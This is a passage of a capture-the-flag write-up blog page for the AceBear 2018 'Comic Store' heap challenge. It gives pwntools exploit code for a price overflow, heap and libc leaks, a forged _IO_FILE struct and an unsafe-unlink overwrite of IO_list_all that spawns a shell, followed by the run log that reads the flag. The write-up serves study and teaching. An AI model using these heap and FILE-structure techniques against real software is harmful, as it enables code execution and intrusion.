+  <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"2"</span><span class="p">)</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">"comic: "</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">"Quantity: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">quantity</span><span class="p">))</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">)</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"3"</span><span class="p">)</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">checkout</span><span class="p">():</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"6"</span><span class="p">)</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"no) "</span><span class="p">,</span> <span class="s">"1"</span><span class="p">)</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">cheat_money</span><span class="p">(</span><span class="n">COMIC</span><span class="p">,</span> <span class="n">PRICE</span><span class="p">,</span> <span class="n">CUR_MONEY</span><span class="p">):</span>
+  <span class="n">add_to_cart</span><span class="p">(</span><span class="n">COMIC</span><span class="p">,</span> <span class="p">(</span><span class="mh">0xffffffff</span> <span class="o">/</span> <span class="n">PRICE</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span>  
+  <span class="n">remove_comic</span><span class="p">(</span><span class="n">COMIC</span><span class="p">,</span> <span class="p">(</span><span class="mh">0xffffffff</span> <span class="o">/</span> <span class="n">PRICE</span><span class="p">)</span> <span class="o">-</span> <span class="p">(</span><span class="n">CUR_MONEY</span><span class="o">/</span><span class="n">PRICE</span><span class="p">))</span>
+
+  <span class="n">checkout</span><span class="p">()</span>
+
+<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">):</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">)</span>
+
+  <span class="n">register</span><span class="p">(</span><span class="s">"A"</span><span class="o">*</span><span class="mi">256</span><span class="p">)</span>
+
+  <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Increase money by overflowing cart price."</span><span class="p">)</span>
+  <span class="n">cheat_money</span><span class="p">(</span><span class="s">"Conan"</span><span class="p">,</span> <span class="mi">31000</span><span class="p">,</span> <span class="mi">300000</span> <span class="p">)</span></code></pre></figure>
+
+<p>Ok, that should wrap it up on getting rich quickly, and now it’s shopping time :)</p>
+
+<p>So, the shop owner might now have to take some additional mortgages to get out his huge debt, but we’re not finished with hurting him even more.</p>
+
+<p>With all this money we’ll now mess up his nicely set up comic list.</p>
+
+<p>Remember, <code class="language-plaintext highlighter-rouge">ASLR</code>, <code class="language-plaintext highlighter-rouge">PIE</code>, <code class="language-plaintext highlighter-rouge">FULL RELRO</code>? We’ll need some leaks to get over this, so let’s get started with getting some information out of this poor shop owner (though we’ll be helping him a little to get out of the debts, so it should be fine :P).</p>
+
+<p>Some freed chunks would help in this. There are only two ways of getting a free chunk in this binary (Buying out all comics of one type and renaming our user).</p>
+
+<p>So, we’ll be using both to leak <code class="language-plaintext highlighter-rouge">heap</code> and <code class="language-plaintext highlighter-rouge">main_arena</code> ptr.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">feedback</span><span class="p">(</span><span class="nb">type</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"4"</span><span class="p">)</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">)</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"3"</span><span class="p">)</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">"choice: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="nb">type</span><span class="p">))</span>  
+  <span class="n">r</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">": "</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">)</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"4"</span><span class="p">)</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">get_user_info</span><span class="p">(</span><span class="n">content_count</span><span class="o">=</span><span class="mi">0</span><span class="p">):</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"4"</span><span class="p">)</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">)</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"1"</span><span class="p">)</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Name:        *"</span><span class="p">)</span>
+  <span class="n">name</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">" *"</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span><span class="p">).</span><span class="n">strip</span><span class="p">()</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Money:       *"</span><span class="p">)</span>
+  <span class="n">money</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">" *"</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span><span class="p">).</span><span class="n">strip</span><span class="p">()</span>
+
+  <span class="n">contlist</span> <span class="o">=</span> <span class="p">[]</span>
+
+  <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">content_count</span><span class="p">):</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Content %d:"</span> <span class="o">%</span> <span class="n">i</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"*"</span><span class="p">)</span>
+    <span class="n">contlist</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">" *"</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span><span class="p">).</span><span class="n">strip</span><span class="p">())</span>
+
+  <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">)</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"4"</span><span class="p">)</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">)</span>
+
+  <span class="k">return</span> <span class="n">name</span><span class="p">,</span> <span class="n">money</span><span class="p">,</span> <span class="n">contlist</span>
+
+<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">):</span>
+  <span class="p">...</span>
+
+  <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Free Ninja comic to prepare heap leak (and reduce Conan comic count to 1)."</span><span class="p">)</span>
+  <span class="n">add_to_cart</span><span class="p">(</span><span class="s">"Ninja Rantaro"</span><span class="p">,</span> <span class="mi">1000000</span><span class="p">)</span> 
+  <span class="n">add_to_cart</span><span class="p">(</span><span class="s">"Conan"</span><span class="p">,</span> <span class="mi">999990</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>    
+  <span class="n">checkout</span><span class="p">()</span>
+
+  <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Rename user to leak heap address from freed Ninja Rantaro chunk."</span><span class="p">)</span>
+  <span class="n">rename</span><span class="p">(</span><span class="s">"A"</span><span class="p">)</span>
+
+  <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Create (big) feedback in user object to leak libc."</span><span class="p">)</span>
+  <span class="n">feedback</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="s">"A"</span><span class="p">)</span>
+
+  <span class="n">name</span><span class="p">,</span> <span class="n">desc</span><span class="p">,</span> <span class="n">content</span> <span class="o">=</span> <span class="n">get_user_info</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+  <span class="n">HEAP</span> <span class="o">=</span> <span class="n">u64</span><span class="p">((</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="o">+</span><span class="n">name</span><span class="p">[</span><span class="mi">1</span><span class="p">:]).</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x200</span>
+  <span class="n">MAIN_ARENA</span> <span class="o">=</span> <span class="n">u64</span><span class="p">((</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="o">+</span><span class="n">content</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">1</span><span class="p">:]).</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span><span class="o">+</span><span class="mh">0x78</span>
+  <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">MAIN_ARENA</span> <span class="o">-</span> <span class="mh">0x3c4b78</span>
+
+  <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"HEAP         : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">HEAP</span><span class="p">))</span>
+  <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"MAIN_ARENA   : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">MAIN_ARENA</span><span class="p">))</span>
+  <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"LIBC         : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="p">))</span></code></pre></figure>
+
+<p>Buying <code class="language-plaintext highlighter-rouge">10000000</code> of <code class="language-plaintext highlighter-rouge">Ninja Rantaro</code> and checking out will result in freeing the <code class="language-plaintext highlighter-rouge">ComicEntry</code> and the corresponding <code class="language-plaintext highlighter-rouge">Comic</code> object for this.</p>
+
+<p>Renaming the user to <code class="language-plaintext highlighter-rouge">A</code> will result in freeing the previous username (Size 0x110) and allocating a new username (Size 0x21, which happens to match the size of the previously freed <code class="language-plaintext highlighter-rouge">ComicEntry</code> object).</p>
+
+<p>This will create the new username inside of the previously freed <code class="language-plaintext highlighter-rouge">ComicEntry</code> which contains a FD pointer pointing to the <code class="language-plaintext highlighter-rouge">Comic</code> object, which we now can leak via the username (<code class="language-plaintext highlighter-rouge">heap</code> leak).</p>
+
+<p>But renaming the user also freed that <code class="language-plaintext highlighter-rouge">0x110</code> chunk, which, since it doesn’t fit into fastbin list, now contains a FD pointer to <code class="language-plaintext highlighter-rouge">main_arena</code>. Pretty useful, so we create a <code class="language-plaintext highlighter-rouge">big</code> feedback, which will then gets served the previously freed <code class="language-plaintext highlighter-rouge">username</code> chunk, so we can leak the <code class="language-plaintext highlighter-rouge">main_arena</code> pointer via the feedback.</p>
+
+<p>Checking the customer info after this:</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">******************************Info********************************
+* Name:        *                                          A\x92uUUU *
+******************************************************************
+* Money:       *                                       834905848 *
+******************************************************************
+*                          Feedback                              *
+******************************************************************
+* Content 0:   *                                          A\x1b��\xff\x7f *
+******************************End*********************************
+
+[*] Increase money by overflowing cart price.
+[*] Free Ninja comic to prepare heap leak (and reduce Conan comic count to 1).
+[*] Rename user to leak heap address from freed Ninja Rantaro chunk.
+[*] Create (big) feedback in user object to leak libc.
+[*] HEAP         : 0x555555759000
+[*] MAIN_ARENA   : 0x7ffff7dd1b78
+[*] LIBC         : 0x7ffff7a0d000</code></pre></figure>
+
+<p>Still, we don’t know <code class="language-plaintext highlighter-rouge">PIE</code> but we won’t need it to get this finished.</p>
+
+<p>What can we do now?</p>
+
+<ul>
+  <li>Overwriting got entries =&gt; <code class="language-plaintext highlighter-rouge">FULL RELRO</code> - Not an option</li>
+  <li>Overwriting <code class="language-plaintext highlighter-rouge">malloc_hook</code> =&gt; Binary only allocs <code class="language-plaintext highlighter-rouge">0x21</code> or <code class="language-plaintext highlighter-rouge">0x110</code> chunks - Not an option</li>
+  <li>Calling <code class="language-plaintext highlighter-rouge">one_gadget</code> =&gt; Bleh, none of the constraints can be fulfilled :(</li>
+  <li>Doing some _IO_file magic =&gt; Yay, way to go :)</li>
+</ul>
+
+<p>The attack plan:</p>
+
+<ul>
+  <li>Forge a fake <code class="language-plaintext highlighter-rouge">_IO_file</code> struct on the heap</li>
+  <li>Free another comic entry to create a dangling pointer</li>
+  <li>Overwrite this comic entry and forge FD/BK to overwrite <code class="language-plaintext highlighter-rouge">_IO_file_all</code> with our fake file struct in the <code class="language-plaintext highlighter-rouge">unsafe unlink</code> in checkout</li>
+  <li>Exit to trigger <code class="language-plaintext highlighter-rouge">_IO_flush_all_lockp</code> =&gt; <code class="language-plaintext highlighter-rouge">_IO_new_file_overflow</code></li>
+</ul>
+
+<p>Let’s finish this quickly. Creating the fake <code class="language-plaintext highlighter-rouge">_IO_file</code> struct is easy, since we still have two feedbacks left (to be honest, I had to rewrite my exploit at this point, since I used up the available feedbacks for leaking heap and libc. So I needed to optimize the leaking, whilst using as few feedbacks as possible).</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Prepare fake file table on heap via feedback"</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s">"/bin/sh</span><span class="se">\x00</span><span class="s">"</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                  <span class="c1"># flags / _IO_read_ptr
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                        <span class="c1"># _IO_read_end     / _IO_read_base
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>                        <span class="c1"># _IO_write_base   / _IO_write_ptr
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                        <span class="c1"># _IO_write_end
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">HEAP</span><span class="o">+</span><span class="mh">0x568</span><span class="o">-</span><span class="mh">0x18</span><span class="p">)</span>          <span class="c1"># &lt;= Jump table (pointing also to this line)
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"system"</span><span class="p">])</span>   <span class="c1"># _IO_new_file_overflow (Jump table + 0x18)
+</span>
+<span class="n">feedback</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>                              <span class="c1"># Write fake _IO_file into heap</span></code></pre></figure>
+
+<p>Since <code class="language-plaintext highlighter-rouge">_IO_write_ptr</code> (1) is bigger than <code class="language-plaintext highlighter-rouge">_IO_write_base</code> (0), this will call <code class="language-plaintext highlighter-rouge">_IO_new_file_overflow</code> when <code class="language-plaintext highlighter-rouge">IO_flush_all_lockp</code> is called (which will happen on exiting the store).</p>
+
+<p>A nice thing here is, that the first argument to <code class="language-plaintext highlighter-rouge">_IO_new_file_overflow</code> will be a pointer to the <code class="language-plaintext highlighter-rouge">_IO_file</code> struct itself (which thus points to the string “/bin/sh”) as angelboy taught us in <a href="https://www.slideshare.net/AngelBoy1/play-with-file-structure-yet-another-binary-exploit-technique">Play with FILE structure</a> :)</p>
+
+<p>Since we still own enough money to buy this whole shop twice, getting another free <code class="language-plaintext highlighter-rouge">ComicEntry</code> chunk is quickly done with</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Buy remaining conan comic to create another freed comic chunk"</span><span class="p">)</span>
+
+<span class="n">add_to_cart</span><span class="p">(</span><span class="s">"Dragon Ball"</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span> <span class="c1"># Put random comic into first cart item entry
+</span><span class="n">add_to_cart</span><span class="p">(</span><span class="s">"Conan"</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>       <span class="c1"># Put remaining conan comic into second cart item entry
+</span><span class="n">checkout</span><span class="p">()</span></code></pre></figure>
+
+<p>This will free the <code class="language-plaintext highlighter-rouge">Conan</code> comic, while keeping it in the cart list (remember to put it in the second slot, though).</p>
+
+<p>Now we can overwrite the <code class="language-plaintext highlighter-rouge">ComicEntry</code> for <code class="language-plaintext highlighter-rouge">Conan</code> by giving a <code class="language-plaintext highlighter-rouge">small</code> feedback:</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Overwrite freed conan comic chunk with fake chunk to prepare unsafe unlink"</span><span class="p">)</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">HEAP</span><span class="o">+</span><span class="mh">0x70</span><span class="p">)</span>                  <span class="c1"># Comic entry (points to a comic with quantity 0)
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">HEAP</span><span class="o">+</span><span class="mh">0x480</span><span class="p">)</span>                <span class="c1"># Prev
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="o">+</span><span class="mh">0x3c5520</span><span class="o">-</span><span class="mi">8</span><span class="p">)</span>   <span class="c1"># Next (overwrite IO_list_all)
+</span>
+<span class="n">feedback</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Put random comic into slot 1 and checkout again to trigger unsafe unlink"</span><span class="p">)</span>
+<span class="n">add_to_cart</span><span class="p">(</span><span class="s">"Dragon Ball"</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
+
+<span class="n">checkout</span><span class="p">()</span></code></pre></figure>
+
+<p>Since the <code class="language-plaintext highlighter-rouge">checkout</code> method will validate every entry in the comic cart, checking if it has a quantity of 0, we’ll just let it point to the <code class="language-plaintext highlighter-rouge">Ninja Rantaro</code> chunk, which had a quantity of 0 (or maybe it was the remaining <code class="language-plaintext highlighter-rouge">Conan</code> entry, doesn’t really matter). So <code class="language-plaintext highlighter-rouge">checkout</code> will think this comic was just sold out and <code class="language-plaintext highlighter-rouge">unlink</code> it, which will then overwrite <code class="language-plaintext highlighter-rouge">IO_list_all</code> with the address of our fake forged <code class="language-plaintext highlighter-rouge">_IO_file</code> struct on the heap.</p>
+
+<p>Adding another random comic into slot 1 to make our freed chunk appear again in the cart list, and free it via <code class="language-plaintext highlighter-rouge">checkout</code>.</p>
+
+<p>Now, all there’s left to do is to exit this derelict shop to trigger the magic :)</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Exit to trigger _IO_new_file_overflow =&gt; system('/bin/sh')"</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"7"</span><span class="p">)</span>
+
+<span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span></code></pre></figure>
+
+<p>This will call <code class="language-plaintext highlighter-rouge">exit(0)</code>, which then will flush the file pointers from <code class="language-plaintext highlighter-rouge">IO_list_all</code>, thus trying to flush our fake file struct on the heap.</p>
+
+<p>Since <code class="language-plaintext highlighter-rouge">_IO_write_ptr</code> was set to a higher value than <code class="language-plaintext highlighter-rouge">_IO_write_base</code>, this will try to call the <code class="language-plaintext highlighter-rouge">_IO_new_file_overflow</code> vtable function from the corresponding jump table, which now points to <code class="language-plaintext highlighter-rouge">system</code>. Like already stated, this will pass a pointer to the <code class="language-plaintext highlighter-rouge">_IO_file</code> struct itself as the first argument. And since we put <code class="language-plaintext highlighter-rouge">/bin/sh</code> there, this will effectively be calling <code class="language-plaintext highlighter-rouge">system("/bin/sh")</code> et voilà</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">$ python xpl.py 1
+[*] '/vagrant/Challenges/acebear/comicstore/comic_store/comic_store'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[*] '/vagrant/Challenges/acebear/comicstore/comic_store/libc.6'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[+] Opening connection to comicstore.acebear.site on port 3005: Done
+[*] Increase money by overflowing cart price.
+[*] Free Ninja comic to prepare heap leak (and reduce Conan comic count to 1).
+[*] Rename user to leak heap address from freed Ninja Rantaro chunk.
+[*] Create (big) feedback in user object to leak libc.
+[*] HEAP         : 0x556fc240c000
+[*] MAIN_ARENA   : 0x7fb688679b78
+[*] LIBC         : 0x7fb6882b5000
+[*] Prepare fake file table on heap via feedback
+[*] Buy remaining conan comic to create another freed comic chunk
+[*] Overwrite freed conan comic chunk with fake chunk to prepare unsafe unlink
+[*] Put random comic into slot 1 and checkout again to trigger unsafe unlink
+[*] Exit to trigger _IO_new_file_overflow =&gt; system('/bin/sh')
+[*] Switching to interactive mode
+$ ls
+comic_store
+flag
+run.sh
+$ cat flag
+AceBear{pl3ase_read_comic_wh3n_u_h4ve_fr33_tim3}</code></pre></figure>
+
+
+    <aside class="share">
+
+      <span>Share this: </span>
+
+      <a href="http://twitter.com/share?text=AceBear 2018 - Comic Store&amp;url=https://kileak.github.io/ctf/2018/acebear-comic_store/"
+      onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+        <i class="icon icon-twitter-rounded"></i>
+      </a>
+
+      <a href="https://www.facebook.com/sharer/sharer.php?u=https://kileak.github.io/ctf/2018/acebear-comic_store/"
+      onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+        <i class="icon icon-facebook-rounded"></i>
+      </a>
+
+    </aside>
+  </div>
+
+  
+  <hr>
+  <aside id="comments" class="disqus">
+    <div class="container">
+      <h3><i class="icon icon-comments-o"></i> Comments</h3>
+      <div id="disqus_thread"></div>
+
+      <script type="text/javascript">
+        var disqus_shortname = 'kileak';
+        var disqus_identifier = '/ctf/2018/acebear-comic_store';
+        var disqus_title = 'AceBear 2018 - Comic Store';
+        var disqus_url = 'https://kileak.github.io/ctf/2018/acebear-comic_store';
+
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+      </script>
+
+      <noscript>
+        Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a>
+      </noscript>
+    </div>
+  </aside>
+
+
+
+</article>
+
+        </section>
+
+        
+<div class="clearfix"></div>
+
+<footer class="site-footer txt-center">
+  <hr>
+
+  <ul class="social">
+    
+  </ul>
+
+  <small>&copy; 2025 All rights reserved. Made with <a href="http://jekyllrb.com" target="_blank">Jekyll</a> and <i class="icon icon-heart"></i></small>
+  <small>by <a href="http://nandomoreira.me" target="_blank">nandomoreira.me</a></small>
+
+</footer>
+
+
+    </main>
+
+    <a href="http://github.com/Kileak" target="_blank" class="github-corner"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#000; color:#fff; position: absolute; top: 0; border: 0; right: 0;"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/jekyll-search.min.js"></script>
+    <script src="/js/main.js"></script>
+  </body>
+</html>
